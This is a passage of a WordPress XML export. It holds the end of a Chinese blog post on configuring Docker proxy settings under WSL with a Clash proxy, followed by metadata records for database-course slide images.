<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">sudo systemctl show --property=Environment docker</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">容器代理配置</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>镜像启动后如果要在容器中使用代理，需要在启动时通过 <code>--env</code> 选项指定 <code>HTTP_PROXY</code> 环境变量或者在 <code>~/.docker/config.json</code> 中添加默认的代理设置。</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><code>--env</code> 选项</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">docker run --env HTTP_PROXY="http://&lt;user&gt;:&lt;password&gt;@&lt;domain&gt;:&lt;port&gt;" &lt;some-image&gt;</pre>
<!-- /wp:preformatted -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><code>config.json</code> 配置</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">{<br> &nbsp;"auths": {<br> &nbsp; &nbsp;"..."<br>  },<br> &nbsp;"proxies": {<br> &nbsp; &nbsp;# 通用配置，会对当前客户端连接的所有Docker服务生效<br> &nbsp; &nbsp;"default": {<br> &nbsp; &nbsp; &nbsp;"httpProxy": "http://192.168.8.176:7897",<br> &nbsp; &nbsp; &nbsp;"httpsProxy": "http://192.168.8.176:7897",<br> &nbsp; &nbsp; &nbsp;"noProxy": "*.test.example.com,.example.org,127.0.0.0/8"<br> &nbsp;  }<br>  }<br>}</pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p>运行成功后通过下面的命令验证相关环境变量是否符合预期：</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted">docker run --rm alpine sh -c 'env | grep -i  _PROXY'</pre>
<!-- /wp:preformatted -->

<!-- wp:heading -->
<h2 class="wp-block-heading">参考资料</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository">Ubuntu | Docker Docs</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><a href="https://www.cnblogs.com/Chary/p/18096678">如何优雅的给 Docker 配置网络代理 - CharyGao - 博客园</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>512</wp:post_id>
		<wp:post_date><![CDATA[2025-04-13 15:21:32]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2025-04-13 07:21:32]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2025-04-13 15:21:33]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2025-04-13 07:21:33]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[wsl-%e5%ae%89%e8%a3%85-docker-%e5%b9%b6%e9%85%8d%e7%bd%ae-clash-%e4%bb%a3%e7%90%86]]></wp:post_name>
		<wp:status><![CDATA[publish]]></wp:status>
		<wp:post_parent>0</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[post]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
										<category domain="post_tag" nicename="%e7%8e%af%e5%a2%83%e9%85%8d%e7%bd%ae"><![CDATA[环境配置]]></category>
		<category domain="category" nicename="conputer-technology"><![CDATA[计算机技术]]></category>
		<category domain="post_tag" nicename="%e8%ae%a1%e7%ae%97%e6%9c%ba%e6%8a%80%e6%9c%af"><![CDATA[计算机技术]]></category>
						<wp:postmeta>
		<wp:meta_key><![CDATA[_edit_last]]></wp:meta_key>
		<wp:meta_value><![CDATA[1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_layout]]></wp:meta_key>
		<wp:meta_value><![CDATA[inherit]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-disabled]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-insert]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-header-label]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alignment]]></wp:meta_key>
		<wp:meta_value><![CDATA[none]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-heading-levels]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:0:{}]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-alttext]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-visibility_hide_by_default]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-hide_counter]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-exclude]]></wp:meta_key>
		<wp:meta_value><![CDATA[]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_ez-toc-position-specific]]></wp:meta_key>
		<wp:meta_value><![CDATA[top]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[WSL 安装 Docker 并配置 clash 代理]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_title]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53958ae40]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81023e1d1]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[Docker, Linux, WSL]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_keywords]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53b74f618]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[0]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_manual_des]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfb81163e1d2]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[seo_description]]></wp:meta_key>
		<wp:meta_value><![CDATA[本文主要介绍以 WSL 形式运行的Ubuntu 22.04 LTS 下安装 docker 并通过宿主机的 clash 代理访问外网的配置流程。 ]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_seo_description]]></wp:meta_key>
		<wp:meta_value><![CDATA[field_5bfa53c54f619]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key>
		<wp:meta_value><![CDATA[521]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[09 Sorting + Aggregations]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=289</link>
		<pubDate>Thu, 10 Mar 2022 02:56:45 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/03/09-Sorting-Aggregations.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>289</wp:post_id>
		<wp:post_date><![CDATA[2022-03-10 10:56:45]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-10 02:56:45]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-10 10:56:45]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-10 02:56:45]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[09-sorting-aggregations]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>288</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/03/09-Sorting-Aggregations.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/03/09-Sorting-Aggregations.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1376;s:6:"height";i:636;s:4:"file";s:35:"2022/03/09-Sorting-Aggregations.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-300x139.jpg";s:5:"width";i:300;s:6:"height";i:139;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:36:"09-Sorting-Aggregations-1024x473.jpg";s:5:"width";i:1024;s:6:"height";i:473;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-768x355.jpg";s:5:"width";i:768;s:6:"height";i:355;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-670x310.jpg";s:5:"width";i:670;s:6:"height";i:310;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:35:"09-Sorting-Aggregations-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[10 Join Algorithms]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=293</link>
		<pubDate>Thu, 10 Mar 2022 16:09:52 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/03/10-Join-Algorithms.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>293</wp:post_id>
		<wp:post_date><![CDATA[2022-03-11 00:09:52]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-10 16:09:52]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-11 00:09:52]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-10 16:09:52]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[10-join-algorithms]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>292</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/03/10-Join-Algorithms.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/03/10-Join-Algorithms.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1392;s:6:"height";i:631;s:4:"file";s:30:"2022/03/10-Join-Algorithms.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:30:"10-Join-Algorithms-300x136.jpg";s:5:"width";i:300;s:6:"height";i:136;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:31:"10-Join-Algorithms-1024x464.jpg";s:5:"width";i:1024;s:6:"height";i:464;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:30:"10-Join-Algorithms-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:30:"10-Join-Algorithms-768x348.jpg";s:5:"width";i:768;s:6:"height";i:348;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:30:"10-Join-Algorithms-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:30:"10-Join-Algorithms-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:30:"10-Join-Algorithms-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:30:"10-Join-Algorithms-670x304.jpg";s:5:"width";i:670;s:6:"height";i:304;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:30:"10-Join-Algorithms-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:30:"10-Join-Algorithms-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[11 Query Execution - Part 1]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=297</link>
		<pubDate>Fri, 11 Mar 2022 01:31:50 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/03/11-Query-Execution-Part-1.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>297</wp:post_id>
		<wp:post_date><![CDATA[2022-03-11 09:31:50]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-11 01:31:50]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-11 09:31:50]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-11 01:31:50]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[11-query-execution-part-1]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>296</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/03/11-Query-Execution-Part-1.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/03/11-Query-Execution-Part-1.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1412;s:6:"height";i:636;s:4:"file";s:37:"2022/03/11-Query-Execution-Part-1.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-300x135.jpg";s:5:"width";i:300;s:6:"height";i:135;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:38:"11-Query-Execution-Part-1-1024x461.jpg";s:5:"width";i:1024;s:6:"height";i:461;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-768x346.jpg";s:5:"width";i:768;s:6:"height";i:346;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-670x302.jpg";s:5:"width";i:670;s:6:"height";i:302;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:37:"11-Query-Execution-Part-1-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[12 Query Execution - Part 2]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=301</link>
		<pubDate>Fri, 11 Mar 2022 02:36:38 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/03/12-Query-Execution-Part-2.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>301</wp:post_id>
		<wp:post_date><![CDATA[2022-03-11 10:36:38]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-11 02:36:38]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-11 10:36:38]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-11 02:36:38]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[12-query-execution-part-2]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>300</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/03/12-Query-Execution-Part-2.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/03/12-Query-Execution-Part-2.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1155;s:6:"height";i:526;s:4:"file";s:37:"2022/03/12-Query-Execution-Part-2.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-300x137.jpg";s:5:"width";i:300;s:6:"height";i:137;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:38:"12-Query-Execution-Part-2-1024x466.jpg";s:5:"width";i:1024;s:6:"height";i:466;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-768x350.jpg";s:5:"width";i:768;s:6:"height";i:350;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-670x305.jpg";s:5:"width";i:670;s:6:"height";i:305;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:37:"12-Query-Execution-Part-2-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";s:11:"orientation";s:1:"0";s:8:"keywords";a:0:{}}}]]></wp:meta_value>
		</wp:postmeta>
							</item>
					<item>
		<title><![CDATA[13 Query Planning & Optimization]]></title>
		<link>http://www.ironmanzzm.top/?attachment_id=308</link>
		<pubDate>Mon, 14 Mar 2022 01:44:44 +0000</pubDate>
		<dc:creator><![CDATA[protectione055]]></dc:creator>
		<guid isPermaLink="false">http://www.ironmanzzm.top/wp-content/uploads/2022/03/13-Query-Planning-Optimization.jpg</guid>
		<description></description>
		<content:encoded><![CDATA[]]></content:encoded>
		<excerpt:encoded><![CDATA[]]></excerpt:encoded>
		<wp:post_id>308</wp:post_id>
		<wp:post_date><![CDATA[2022-03-14 09:44:44]]></wp:post_date>
		<wp:post_date_gmt><![CDATA[2022-03-14 01:44:44]]></wp:post_date_gmt>
		<wp:post_modified><![CDATA[2022-03-14 09:44:44]]></wp:post_modified>
		<wp:post_modified_gmt><![CDATA[2022-03-14 01:44:44]]></wp:post_modified_gmt>
		<wp:comment_status><![CDATA[open]]></wp:comment_status>
		<wp:ping_status><![CDATA[closed]]></wp:ping_status>
		<wp:post_name><![CDATA[13-query-planning-optimization]]></wp:post_name>
		<wp:status><![CDATA[inherit]]></wp:status>
		<wp:post_parent>307</wp:post_parent>
		<wp:menu_order>0</wp:menu_order>
		<wp:post_type><![CDATA[attachment]]></wp:post_type>
		<wp:post_password><![CDATA[]]></wp:post_password>
		<wp:is_sticky>0</wp:is_sticky>
						<wp:attachment_url><![CDATA[http://www.ironmanzzm.top/wp-content/uploads/2022/03/13-Query-Planning-Optimization.jpg]]></wp:attachment_url>
											<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attached_file]]></wp:meta_key>
		<wp:meta_value><![CDATA[2022/03/13-Query-Planning-Optimization.jpg]]></wp:meta_value>
		</wp:postmeta>
							<wp:postmeta>
		<wp:meta_key><![CDATA[_wp_attachment_metadata]]></wp:meta_key>
		<wp:meta_value><![CDATA[a:5:{s:5:"width";i:1178;s:6:"height";i:529;s:4:"file";s:42:"2022/03/13-Query-Planning-Optimization.jpg";s:5:"sizes";a:10:{s:6:"medium";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-300x135.jpg";s:5:"width";i:300;s:6:"height";i:135;s:9:"mime-type";s:10:"image/jpeg";}s:5:"large";a:4:{s:4:"file";s:43:"13-Query-Planning-Optimization-1024x460.jpg";s:5:"width";i:1024;s:6:"height";i:460;s:9:"mime-type";s:10:"image/jpeg";}s:9:"thumbnail";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-150x150.jpg";s:5:"width";i:150;s:6:"height";i:150;s:9:"mime-type";s:10:"image/jpeg";}s:12:"medium_large";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-768x345.jpg";s:5:"width";i:768;s:6:"height";i:345;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-small";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:17:"dashscroll-medium";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}s:16:"dashscroll-large";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-670x377.jpg";s:5:"width";i:670;s:6:"height";i:377;s:9:"mime-type";s:10:"image/jpeg";}s:18:"dashscroll-large-h";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-670x301.jpg";s:5:"width";i:670;s:6:"height";i:301;s:9:"mime-type";s:10:"image/jpeg";}s:9:"alx-small";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-200x200.jpg";s:5:"width";i:200;s:6:"height";i:200;s:9:"mime-type";s:10:"image/jpeg";}s:10:"alx-medium";a:4:{s:4:"file";s:42:"13-Query-Planning-Optimization-520x293.jpg";s:5:"width";i:520;s:6:"height";i:293;s:9:"mime-type";s:10:"image/jpeg";}}s:10:"image_meta";a:12:{s:8:"aperture";s:1:"0";s:6:"credit";s:0:"";s:6:"camera";s:0:"";s:7:"caption";s:0:"";s:17:"created_timestamp";s:1:"0";s:9:"copyright";s:0:"";s:12:"focal_length";s:1:"0";s:3:"iso";s:1:"0";s:13:"shutter_speed";s:1:"0";s:5:"title";s:0:"";